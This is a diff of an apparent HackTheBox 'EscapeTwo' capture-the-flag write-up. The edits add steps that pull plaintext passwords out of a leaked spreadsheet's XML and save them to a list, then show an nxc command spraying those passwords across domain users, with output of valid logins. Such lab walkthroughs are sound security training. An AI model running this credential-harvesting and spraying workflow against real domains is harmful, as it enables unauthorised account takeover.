@@ -73,7 +73,7 @@ SMB         10.10.11.51     445    DC01             Users           READ
 
 And the users
 ```bash
-nxc ldap 'DC01' -u users.txt -p creds.txt -d 'sequel.htb' --users | awk '{print $5}' | grep -vE '[\[|^-]' > users.txt
+nxc ldap 'DC01' -u 'rose' -p creds.txt -d 'sequel.htb' --users | awk '{print $5}' | grep -vE '[\[|^-]' > users.txt
 
 Administrator
 Guest
@@ -118,10 +118,41 @@ file #1:  bad zipfile offset (local header sig):  0
   inflating: docProps/custom.xml     
   inflating: [Content_Types].xml     
                                                                                                                                                                                              
-wither@kali:~/CTF/HTB/EscapeTwo/files/10.10.11.51/Accounting Department$ grep -r "Password"                                                                  
+wither@kali:~/CTF/HTB/EscapeTwo/files/10.10.11.51/Accounting Department$ grep -r "Password" > sharedstrings.txt                                                                  
 xl/sharedStrings.xml:<sst xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" count="25" uniqueCount="24"><si><t xml:space="preserve">First Name</t></si><si><t xml:space="preserve">Last Name</t></si><si><t xml:space="preserve">Email</t></si><si><t xml:space="preserve">Username</t></si><si><t xml:space="preserve">Password</t></si><si><t xml:space="preserve">Angela</t></si><si><t xml:space="preserve">Martin</t></si><si><t xml:space="preserve">angela@sequel.htb</t></si><si><t xml:space="preserve">angela</t></si><si><t xml:space="preserve">0fwz7Q4mSpurIt99</t></si><si><t xml:space="preserve">Oscar</t></si><si><t xml:space="preserve">Martinez</t></si><si><t xml:space="preserve">oscar@sequel.htb</t></si><si><t xml:space="preserve">oscar</t></si><si><t xml:space="preserve">86LxLBMgEWaKUnBG</t></si><si><t xml:space="preserve">Kevin</t></si><si><t xml:space="preserve">Malone</t></si><si><t xml:space="preserve">kevin@sequel.htb</t></si><si><t xml:space="preserve">kevin</t></si><si><t xml:space="preserve">Md9Wlq1E5bZnVDVo</t></si><si><t xml:space="preserve">NULL</t></si><si><t xml:space="preserve">sa@sequel.htb</t></si><si><t xml:space="preserve">sa</t></si><si><t xml:space="preserve">MSSQLP@ssw0rd!</t></si></sst>
-
 ```
+
+Clean up and save those passwords, adding them to the `creds.txt` list
+```bash
+grep -oP '<t xml:space="preserve">.*?</t>' sharedstrings.txt | sed -E -n '10p;15p;20p;24p' | sed -E 's/<\/?t[^>]*>//g' >> creds.txt 
+
+cat creds.txt 
+
+KxEPkKe6R8su
+0fwz7Q4mSpurIt99
+86LxLBMgEWaKUnBG
+Md9Wlq1E5bZnVDVo
+MSSQLP@ssw0rd!
+0fwz7Q4mSpurIt99
+86LxLBMgEWaKUnBG
+Md9Wlq1E5bZnVDVo
+MSSQLP@ssw0rd!
+```
+
+Use the `users.txt` list I made earlier and that list of passwords to spray the domain again, to find a valid login for `oscar` and password `86LxLBMgEWaKUnBG`
+```bash
+nxc smb 'DC01' -u users.txt -p creds.txt -d 'sequel.htb' --continue-on-success                                                     
+...
+SMB         10.10.11.51     445    DC01             [+] sequel.htb\rose:KxEPkKe6R8su 
+...
+SMB         10.10.11.51     445    DC01             [+] sequel.htb\oscar:86LxLBMgEWaKUnBG 
+...
+```
+
+
+
+
+
 
 ## Enumeration
 
